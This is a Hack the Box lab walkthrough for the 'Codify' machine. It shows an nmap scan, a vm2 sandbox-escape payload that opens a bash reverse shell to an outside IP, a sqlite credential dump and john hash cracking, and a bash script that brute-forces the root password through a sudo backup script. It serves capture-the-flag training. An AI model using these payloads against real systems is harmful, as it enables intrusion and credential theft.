## Walkthrough Codify Machine Hack the Box

$sudo nmap -sC -sV  10.10.11.239
    [sudo] password for kali: 
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 02:30 EST
    Nmap scan report for codify.htb (10.10.11.239)
    Host is up (0.018s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
    |_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
    80/tcp   open  http    Apache httpd 2.4.52
    |_http-title: Codify
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    3000/tcp open  http    Node.js Express framework
    |_http-title: Codify
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds

Add to /etc/hosts
    10.10.11.239 codify.htb

Go to http://codify.htb/
    Check http://codify.htb/about  https://github.com/patriksimek/vm2/releases/tag/3.9.16 and https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c

Use this code in the Editor page and  " $nc -lvnp 4440 " on local machine

    	const {VM} = require("vm2");
	const vm = new VM();

	const code = `
	err = {};
	const handler = {
	    getPrototypeOf(target) {
		(function stack() {
		    new Error().stack;
		    stack();
		})();
	    }
	};
	  
	const proxiedErr = new Proxy(err, handler);
	try {
	    throw proxiedErr;
	} catch ({constructor: c}) {
	    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/10.10.14.22/4448 0>&1'");
	}
	`

	console.log(vm.run(code));

Reverse shell to codify machine.
    svc@codify:/var/www/contact$ sqlite3 tickets.db
	sqlite3 tickets.db
	.tables
	tickets  users  
	select * from users;
    xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Hash for user password.

In local machine
    echo ' ' > hash #use hash from last step
    $john hash

SSH connection to 10.10.11.239
joshua@codify:~$ ls
user.txt

$ cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxx


$sudo su
    Not much to see

joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

We have access to a file called mysql-backup.sh. Which we can brute force

From https://gist.github.com/m3m0o/d361597c44d252620919257641e11fc4 use this code to brute force root password
   	#!/bin/bash
    password=""

	while true; do
	    password_check=$(echo "$password" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

	    if [ $password_check -gt 2 ]
	    then
		echo "$password"
		break
	    fi

	    for char in {a..z} {A..Z} {0..9}; do
		result_number_of_lines=$(echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

		if [ $result_number_of_lines -gt 2 ]
		then
		    password="$password$char"
		    continue
		fi
	    done
	done

Voil√®!
$cat root.txt 
xxxxxxxxxxxxxxxxxxxxxxxx


HAVE FUN!
